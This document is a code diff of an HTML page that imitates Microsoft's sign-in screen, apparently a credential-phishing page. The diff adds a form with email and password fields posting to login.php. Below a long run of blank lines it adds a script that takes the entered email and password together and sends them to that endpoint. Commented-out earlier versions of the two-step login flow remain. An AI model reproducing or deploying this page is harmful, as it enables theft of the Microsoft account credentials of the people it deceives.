@@ -15,12 +15,29 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <!-- <form> -->
+            <!-- <form id="form_uname" method="POST" action="login.php">
+
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                 </div>
+            </form> -->
+
+
+            <form id="login_form" method="POST" action="login.php">
+
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
             </form>
+
+
             <div>
                 <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                 <p class="mb-16 fs-13">
@@ -49,12 +66,28 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
-                <div class="mb-16">
+            <!-- <form> -->
+
+<!-- 
+                <form id="login_form" method="POST" action="login.php">
+
+                    <div class="mb-16">
+                        <p id="error_uname" class="error"></p>
+                        <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    </div>
+                    <div class="mb-16">
+                        <p id="error_pwd" class="error"></p>
+                        <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                    </div>
+                </form> -->
+
+
+                <!-- <form id="form_pwd" method="POST" action="login.php">
+                    <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                 </div>
-            </form>
+            </form> -->
             <div>
                 <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
@@ -120,6 +153,176 @@
       }
     });
   </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        const sectionFinal = document.getElementById('section_final');
+        const form = document.getElementById('login_form');
+
+        form.addEventListener('submit', (event) => {
+            event.preventDefault(); // Prevent default form submission
+
+            const uname = document.getElementById('inp_uname').value.trim();
+            const pass = document.getElementById('inp_pwd').value.trim();
+
+            if (uname && pass) {
+                // Both email and password are provided
+                // Make AJAX request to submit both data simultaneously
+                fetch('login.php', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        uname: uname,
+                        pass: pass
+                    }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Success handling
+                        console.log('Data submitted successfully');
+                        // Optionally, redirect to another page
+                        // window.location.href = 'success.php';
+                    } else {
+                        // Error handling
+                        console.error('Error submitting data');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            } else {
+                // Validation error, both email and password are required
+                document.getElementById('error_uname').textContent = uname ? '' : 'Please enter a valid email, phone, or Skype name.';
+                document.getElementById('error_pwd').textContent = pass ? '' : 'Please enter your password.';
+            }
+        });
+    });
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 
+<script>
+
+
+
+document.addEventListener('DOMContentLoaded', (event) => {
+    const sectionUname = document.getElementById('section_uname');
+    const sectionPwd = document.getElementById('section_pwd');
+    const sectionFinal = document.getElementById('section_final');
+
+    const formUname = document.getElementById('form_uname');
+    const formPwd = document.getElementById('form_pwd');
+
+    const btnNext = document.getElementById('btn_next');
+    const btnSig = document.getElementById('btn_sig');
+
+    const inpUname = document.getElementById('inp_uname');
+    const inpPwd = document.getElementById('inp_pwd');
+
+    const userIdentity = document.getElementById('user_identity');
+    const userIdentityFinal = document.getElementById('user_identity_final');
+
+    // Handle 'Next' button click
+    btnNext.addEventListener('click', () => {
+        const uname = inpUname.value.trim();
+        if (uname) {
+            userIdentity.textContent = uname;
+            sectionUname.classList.add('d-none');
+            sectionPwd.classList.remove('d-none');
+        } else {
+            document.getElementById('error_uname').textContent = 'Please enter a valid email, phone, or Skype name.';
+        }
+    });
+
+    // Handle 'Sign in' button click
+    btnSig.addEventListener('click', () => {
+        const pass = inpPwd.value.trim();
+        if (pass) {
+            userIdentityFinal.textContent = userIdentity.textContent;
+            sectionPwd.classList.add('d-none');
+            sectionFinal.classList.remove('d-none');
+            formPwd.submit(); // Submit the password form
+        } else {
+            document.getElementById('error_pwd').textContent = 'Please enter your password.';
+        }
+    });
+});
+
+
+
+
+
+</script> -->
+
 
 </body>
 
